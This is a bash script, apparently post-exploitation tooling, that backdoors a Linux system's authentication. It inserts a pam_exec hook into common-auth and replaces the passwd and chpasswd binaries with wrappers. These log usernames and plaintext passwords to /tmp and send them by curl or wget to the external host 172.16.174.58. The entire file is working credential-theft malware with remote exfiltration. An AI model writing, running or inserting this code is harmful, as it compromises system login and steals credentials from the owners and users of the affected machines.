#!/bin/bash

###########################
### BACKDOORING PAM
###########################
FILE=/tmp/log.txt
touch $FILE
chmod 777 $FILE

echo "auth sufficient pam_exec.so expose_authtok /usr/local/bin/login.sh" | cat - /etc/pam.d/common-auth > /tmp/common-auth && mv /tmp/common-auth /etc/pam.d/common-auth

cat > /usr/local/bin/login.sh << EOF
#!/bin/sh
read password
echo "User: \$PAM_USER" >> $FILE
echo "Ruser: \$PAM_RUSER" >> $FILE
echo "Rhost: \$PAM_RHOST" >> $FILE
echo "Service: \$PAM_SERVICE" >> $FILE
echo "TTY: \$PAM_TTY" >> $FILE
echo "Password : \$password" >> $FILE
password=\$(python3 -c "import urllib.parse; print(urllib.parse.quote('''\$password'''))")
if command -v curl >/dev/null 2>&1; then
    curl -s -o /dev/null "http://172.16.174.58/\$password?user=\$PAM_USER"
else
    wget -q -O /dev/null "http://172.16.174.58/\$password?user=\$PAM_USER"
fi
EOF

chmod 700 /usr/local/bin/login.sh
chown root:root /usr/local/bin/login.sh

###########################
### BACKDOORING PASSWD
###########################
cp /usr/bin/passwd /usr/bin/passwd.orig
chmod +x /usr/bin/passwd.orig

cat > /usr/bin/passwd << EOF
#!/bin/bash
read -s -p "Enter new UNIX password: " pass
echo ""
read -s -p "Retype new password: " pass
echo "\$(whoami):\$pass" >> /tmp/log.txt
pass=\$(python3 -c "import urllib.parse; print(urllib.parse.quote('''\$pass'''))")
if command -v curl >/dev/null 2>&1; then
    curl -s -o /dev/null "http://172.16.174.58/\$pass?user=\$(whoami)"
else
    wget -q -O /dev/null "http://172.16.174.58/\$pass?user=\$(whoami)"
fi
printf "%s\n%s\n" "\$pass" "\$pass" | /usr/bin/passwd.orig >/dev/null 2>&1
echo ""
EOF


###########################
### BACKDOORING CHPASSWD
###########################
cp /usr/sbin/chpasswd /usr/sbin/chpasswd.orig
chmod +x /usr/sbin/chpasswd.orig

cat > /usr/sbin/chpasswd << 'EOF'
#!/bin/bash
temp_file=$(mktemp)
sp
# Capture input and log it
while IFS= read -r line; do
    echo "$line" >> /tmp/chpasswd_log.txt
    username=$(echo "$line" | cut -d: -f1)
    password=$(echo "$line" | cut -d: -f2)
    
    # URL encode the password
    encoded_pass=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$password'''))")

    # Send data silently
    if command -v curl >/dev/null 2>&1; then
        curl -s -o /dev/null "http://172.16.174.58/$encoded_pass?user=$username"
    else
        wget -q -O /dev/null "http://172.16.174.58/$encoded_pass?user=$username"
    fi

    echo "$line" >> "$temp_file"
done

cat "$temp_file" | /usr/sbin/chpasswd.orig >/dev/null 2>&1
rm -f "$temp_file"
EOF
chmod +x /usr/sbin/chpasswd
